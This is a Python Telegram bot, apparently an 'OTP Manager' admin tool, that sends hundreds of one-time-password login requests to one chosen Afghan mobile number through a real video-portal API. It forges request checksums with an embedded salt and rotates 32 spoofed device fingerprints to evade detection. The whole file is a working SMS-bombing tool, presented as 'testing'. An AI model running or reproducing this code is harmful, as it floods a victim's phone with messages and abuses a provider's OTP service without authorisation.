import asyncio
import hashlib
import json
import logging
import os
import random
import time
import uuid
import urllib.request
import urllib.error
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.error import TelegramError, RetryAfter, BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
log = logging.getLogger("otp-bot")

# ---------------------------------------------------------------------------
# Load config from tg.txt
#   Line 1: bot token
#   Line 2: admin id(s), comma-separated
# ---------------------------------------------------------------------------
CONFIG_PATH = Path(__file__).resolve().parent / "tg.txt"


def _load_config(path: Path) -> tuple[str, set[int]]:
    if not path.exists():
        raise SystemExit(
            f"❌ Config file not found: {path}\n"
            f"Create it with 2 lines:\n"
            f"  Line 1: bot token\n"
            f"  Line 2: admin id(s) comma-separated"
        )

    raw = path.read_text(encoding="utf-8").splitlines()
    if len(raw) < 2:
        raise SystemExit(
            f"❌ {path} must contain at least 2 lines "
            f"(line 1 = token, line 2 = admin id(s))."
        )

    token = raw[0].strip()
    if not token:
        raise SystemExit(f"❌ Line 1 of {path} (bot token) is empty.")

    ids: set[int] = set()
    for chunk in raw[1].strip().split(","):
        chunk = chunk.strip()
        if not chunk:
            continue
        try:
            ids.add(int(chunk))
        except ValueError:
            log.warning("Ignoring invalid admin id in tg.txt: %r", chunk)

    if not ids:
        raise SystemExit(
            f"❌ Line 2 of {path} has no valid admin IDs. "
            f"Example: 123456789 or 123456789,987654321"
        )

    return token, ids


BOT_TOKEN, ADMIN_IDS = _load_config(CONFIG_PATH)

# Admin filter used on every privileged handler
ADMIN = filters.User(user_id=list(ADMIN_IDS))

# ---------------------------------------------------------------------------
# API constants (from tester.py)
# ---------------------------------------------------------------------------
HOST = "videobox.etisalat.af"
PORTAL_ID = 9
SALT = "54IzSRi"
API = "https://portal-api.hungama.com"
TESTER_UA = "VideoBox-SingleRequest-Tester/1.0"
PRODUCT_ID = "5405"

MAX_MESSAGE_LEN = 4000
MAX_COUNT = 500

# ---------------------------------------------------------------------------
# 32 randomized device fingerprints
# ---------------------------------------------------------------------------
DEVICE_POOL = [
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "Pixel 7", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "119.0.0.0", "device": "SM-G991B", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "14", "browser": "Chrome", "browserVersion": "121.0.0.0", "device": "Pixel 8 Pro", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1", "os": "iOS", "osVersion": "17.1", "browser": "Safari", "browserVersion": "17.1", "device": "iPhone", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", "os": "iOS", "osVersion": "16.6", "browser": "Safari", "browserVersion": "16.6", "device": "iPhone", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "11", "browser": "Chrome", "browserVersion": "118.0.0.0", "device": "Redmi Note 10", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "10", "browser": "Chrome", "browserVersion": "117.0.0.0", "device": "SM-A505F", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "SM-S918B", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1", "os": "iPadOS", "osVersion": "17.1", "browser": "Safari", "browserVersion": "17.1", "device": "iPad", "deviceType": "tablet", "orientation": "landscape", "isTablet": True, "isMobile": False, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; moto g(60)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "119.0.0.0", "device": "moto g(60)", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "Infinix X6817", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 14; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "14", "browser": "Chrome", "browserVersion": "121.0.0.0", "device": "CPH2451", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; TECNO KI5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "118.0.0.0", "device": "TECNO KI5", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "11", "browser": "Chrome", "browserVersion": "117.0.0.0", "device": "Nokia G20", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "vivo V2204", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; RMX3511) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "119.0.0.0", "device": "realme RMX3511", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "14", "browser": "Chrome", "browserVersion": "121.0.0.0", "device": "SM-F946B", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 10; LM-K520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "10", "browser": "Chrome", "browserVersion": "116.0.0.0", "device": "LM-K520", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; 2201117TY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "2201117TY", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; Nokia C31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "118.0.0.0", "device": "Nokia C31", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "11", "browser": "Chrome", "browserVersion": "117.0.0.0", "device": "M2101K7AG", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "14", "browser": "Chrome", "browserVersion": "122.0.0.0", "device": "Pixel 8", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1", "os": "iOS", "osVersion": "15.7", "browser": "Safari", "browserVersion": "15.7", "device": "iPhone", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "119.0.0.0", "device": "SM-T870", "deviceType": "tablet", "orientation": "landscape", "isTablet": True, "isMobile": False, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "TB-X606F", "deviceType": "tablet", "orientation": "landscape", "isTablet": True, "isMobile": False, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "11", "browser": "Chrome", "browserVersion": "116.0.0.0", "device": "SM-A125F", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "14", "browser": "Chrome", "browserVersion": "121.0.0.0", "device": "23127PN0CG", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 10; Infinix X657) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "10", "browser": "Chrome", "browserVersion": "115.0.0.0", "device": "Infinix X657", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 12; CPH2363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "12", "browser": "Chrome", "browserVersion": "118.0.0.0", "device": "CPH2363", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "SM-A546B", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 11; RMX3231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "11", "browser": "Chrome", "browserVersion": "117.0.0.0", "device": "RMX3231", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
    {"userAgent": "Mozilla/5.0 (Linux; Android 13; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "osVersion": "13", "browser": "Chrome", "browserVersion": "120.0.0.0", "device": "SM-G780G", "deviceType": "mobile", "orientation": "portrait", "isTablet": False, "isMobile": True, "isDesktop": False},
]


# ---------------------------------------------------------------------------
# Core API helpers
# ---------------------------------------------------------------------------
def checksum(*parts):
    return hashlib.sha512("".join(str(p) for p in parts).encode()).hexdigest()


def api_post(path, body, token, user_agent=TESTER_UA):
    data = json.dumps(body).encode()
    req = urllib.request.Request(API + path, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", user_agent)
    req.add_header("X-CHECKSUM-TOKEN", token)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode()
        except Exception:
            return e.code, ""
    except Exception as e:
        return 0, json.dumps({"error": str(e)})


def normalize(msisdn: str) -> str:
    n = "".join(c for c in (msisdn or "") if c.isdigit())
    if n.startswith("0093"):
        n = n[2:]
    elif n.startswith("0"):
        n = "93" + n[1:]
    elif len(n) == 9:
        n = "93" + n
    return n


def send_one_otp(msisdn_raw):
    """Blocking — call via asyncio.to_thread. Never raises."""
    try:
        msisdn = normalize(msisdn_raw)
        if not (msisdn.startswith("93") and len(msisdn) == 11):
            return None, "Invalid Afghan mobile number."
        device = random.choice(DEVICE_POOL)
        rid = str(uuid.uuid4())
        token = checksum(HOST, rid, msisdn, PRODUCT_ID, PORTAL_ID, SALT)
        body = {
            "requestId": rid, "hostName": HOST, "portalId": PORTAL_ID,
            "msisdn": msisdn, "productId": PRODUCT_ID, "language": "en",
            "isDebug": False, "source": "1",
        }
        body.update(device)
        status, text = api_post("/webapi/login/v1/login", body, token,
                                device["userAgent"])
        try:
            parsed = json.loads(text)
        except Exception:
            parsed = {"raw": text}
        return {
            "status": status, "msisdn": msisdn,
            "device": device["device"], "resp": parsed,
        }, None
    except Exception as e:
        return None, f"exception: {e}"


# ---------------------------------------------------------------------------
# Telegram-safe send/edit helpers
# ---------------------------------------------------------------------------
async def safe_send(chat, text, **kwargs):
    try:
        return await chat.send_message(text, **kwargs)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        try:
            return await chat.send_message(text, **kwargs)
        except TelegramError as e2:
            log.warning("send_message failed after retry: %s", e2)
            return None
    except TelegramError as e:
        log.warning("send_message failed: %s", e)
        return None


async def safe_edit(message, text, **kwargs):
    try:
        return await message.edit_text(text, **kwargs)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        try:
            return await message.edit_text(text, **kwargs)
        except (TelegramError, BadRequest):
            return None
    except BadRequest:
        return None
    except TelegramError as e:
        log.warning("edit_text failed: %s", e)
        return None


# ---------------------------------------------------------------------------
# Conversation states
# ---------------------------------------------------------------------------
ASK_NUMBER, ASK_COUNT, ASK_SLEEP = range(3)


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    ctx.user_data.clear()
    await safe_send(
        update.effective_chat,
        "👋 *OTP Manager Bot*\n\n"
        "Send the Afghan mobile number you want to test\n"
        "(e.g. `0700123456` or `+93700123456`).",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_NUMBER


async def got_number(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    raw = (update.message.text or "").strip()
    msisdn = normalize(raw)
    if not (msisdn.startswith("93") and len(msisdn) == 11):
        await safe_send(
            update.effective_chat,
            "❌ That doesn't look like a valid Afghan mobile number.\n"
            "Try again (e.g. `0700123456`).",
            parse_mode=ParseMode.MARKDOWN,
        )
        return ASK_NUMBER
    ctx.user_data["msisdn"] = msisdn
    await safe_send(
        update.effective_chat,
        f"✅ Number: `{msisdn}`\n\nHow many OTP requests should I send? (1–{MAX_COUNT})",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ASK_COUNT


async def got_count(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        n = int((update.message.text or "").strip())
        if not 1 <= n <= MAX_COUNT:
            raise ValueError
    except ValueError:
        await safe_send(
            update.effective_chat,
            f"❌ Please send a number between 1 and {MAX_COUNT}.",
        )
        return ASK_COUNT
    ctx.user_data["count"] = n

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("1.0 s", callback_data="1.0"),
         InlineKeyboardButton("0.5 s", callback_data="0.5"),
         InlineKeyboardButton("0.05 s", callback_data="0.05")],
        [InlineKeyboardButton("Custom…", callback_data="custom")],
    ])
    await safe_send(
        update.effective_chat,
        "How much sleep between each request?",
        reply_markup=kb,
    )
    return ASK_SLEEP


async def got_sleep_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    q = update.callback_query
    try:
        await q.answer()
    except TelegramError:
        pass
    if q.data == "custom":
        await safe_edit(
            q.message,
            "Send the sleep interval in seconds (e.g. `0.25`).",
            parse_mode=ParseMode.MARKDOWN,
        )
        return ASK_SLEEP
    ctx.user_data["sleep"] = float(q.data)
    await safe_edit(q.message, f"⏱ Using {q.data}s between requests. Starting…")
    return await run_job(update, ctx)


async def got_sleep_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        s = float((update.message.text or "").strip())
        if s < 0 or s > 60:
            raise ValueError
    except ValueError:
        await safe_send(
            update.effective_chat,
            "❌ Send a number between 0 and 60 seconds.",
        )
        return ASK_SLEEP
    ctx.user_data["sleep"] = s
    return await run_job(update, ctx)


async def run_job(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    chat = update.effective_chat
    try:
        msisdn = ctx.user_data.get("msisdn")
        count = ctx.user_data.get("count")
        sleep = ctx.user_data.get("sleep")
        if not (msisdn and count and sleep is not None):
            await safe_send(chat, "⚠️ State lost. Send /start again.")
            return ConversationHandler.END

        status_msg = await safe_send(
            chat,
            f"🚀 Sending *{count}* OTP requests to `{msisdn}`\n"
            f"⏱ Sleep: *{sleep}s* between each",
            parse_mode=ParseMode.MARKDOWN,
        )

        ok, fail, lines = 0, 0, []
        for i in range(1, count + 1):
            try:
                result, err = await asyncio.to_thread(send_one_otp, msisdn)
            except Exception as e:
                result, err = None, f"worker error: {e}"

            if err:
                fail += 1
                lines.append(f"#{i} ❌ {err}")
            else:
                st = result["status"]
                if st == 200:
                    ok += 1
                    lines.append(f"#{i} ✅ 200 · {result['device']}")
                else:
                    fail += 1
                    brief = json.dumps(result["resp"], ensure_ascii=False)[:80]
                    lines.append(f"#{i} ❌ {st} · {brief}")

            if (i % 5 == 0 or i == count) and status_msg:
                status_msg = await safe_edit(
                    status_msg,
                    f"📊 Progress {i}/{count} — ✅ {ok} / ❌ {fail}",
                )

            if i < count:
                try:
                    await asyncio.sleep(sleep)
                except Exception:
                    pass

        tail = "\n".join(lines[-10:])
        summary = (
            "🏁 Done\n\n"
            f"Number: {msisdn}\n"
            f"Requests: {count}\n"
            f"✅ Success: {ok}\n"
            f"❌ Failed: {fail}\n\n"
            f"Last 10 results:\n{tail}"
        )
        if len(summary) > MAX_MESSAGE_LEN:
            summary = summary[:MAX_MESSAGE_LEN] + "…"

        await safe_send(chat, summary)
        await safe_send(
            chat,
            "What next?",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 New run", callback_data="restart")],
            ]),
        )
    except Exception as e:
        log.exception("run_job crashed")
        await safe_send(chat, f"💥 Unexpected error: {e}")
    return ConversationHandler.END


async def restart(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    q = update.callback_query
    try:
        await q.answer()
    except TelegramError:
        pass
    ctx.user_data.clear()
    await safe_edit(q.message, "Send the Afghan mobile number to test.")
    return ASK_NUMBER


async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    await safe_send(update.effective_chat, "Cancelled.")
    return ConversationHandler.END


# ---------------------------------------------------------------------------
# /whoami + non-admin handler
# ---------------------------------------------------------------------------
async def whoami(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await safe_send(
        update.effective_chat,
        f"Your Telegram ID: `{u.id}`\n"
        f"Admin access: {'✅ yes' if u.id in ADMIN_IDS else '⛔ no'}",
        parse_mode=ParseMode.MARKDOWN,
    )


async def not_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        try:
            await update.callback_query.answer("Not authorized.")
        except TelegramError:
            pass

    if not update.effective_user or not update.effective_message:
        return

    told = ctx.bot_data.setdefault("told_non_admins", set())
    if update.effective_user.id in told:
        return
    told.add(update.effective_user.id)

    await safe_send(
        update.effective_chat,
        f"⛔ This bot is private.\n\n"
        f"Your Telegram ID is `{update.effective_user.id}` — "
        f"send it to the admin to request access.",
        parse_mode=ParseMode.MARKDOWN,
    )


# ---------------------------------------------------------------------------
# Global error handler
# ---------------------------------------------------------------------------
async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    log.error("Unhandled exception", exc_info=ctx.error)
    if isinstance(update, Update) and update.effective_chat:
        try:
            await safe_send(
                update.effective_chat,
                f"⚠️ Something went wrong, but the bot is still running.\n"
                f"{type(ctx.error).__name__}: {ctx.error}",
            )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .get_updates_read_timeout(30)
        .build()
    )

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start, filters=ADMIN)],
        states={
            ASK_NUMBER: [
                MessageHandler(ADMIN & filters.TEXT & ~filters.COMMAND, got_number),
            ],
            ASK_COUNT: [
                MessageHandler(ADMIN & filters.TEXT & ~filters.COMMAND, got_count),
            ],
            ASK_SLEEP: [
                CallbackQueryHandler(
                    got_sleep_button,
                    pattern=r"^(1\.0|0\.5|0\.05|custom)$",
                ),
                MessageHandler(ADMIN & filters.TEXT & ~filters.COMMAND, got_sleep_text),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel, filters=ADMIN)],
        allow_reentry=True,
    )

    app.add_handler(conv, group=0)
    app.add_handler(CommandHandler("cancel", cancel, filters=ADMIN), group=0)
    app.add_handler(CallbackQueryHandler(restart, pattern="^restart$"), group=0)
    app.add_handler(CommandHandler("whoami", whoami), group=0)

    # Catch everything else from non-admins
    app.add_handler(MessageHandler(~ADMIN & ~filters.COMMAND, not_admin), group=1)
    app.add_handler(CallbackQueryHandler(not_admin), group=1)

    app.add_error_handler(error_handler)

    log.info("Starting bot — admins: %s", sorted(ADMIN_IDS))
    while True:
        try:
            app.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True,
            )
            break
        except KeyboardInterrupt:
            log.info("Stopped by Ctrl+C")
            break
        except Exception:
            log.exception("Polling crashed; restarting in 5s")
            time.sleep(5)


if __name__ == "__main__":
    main()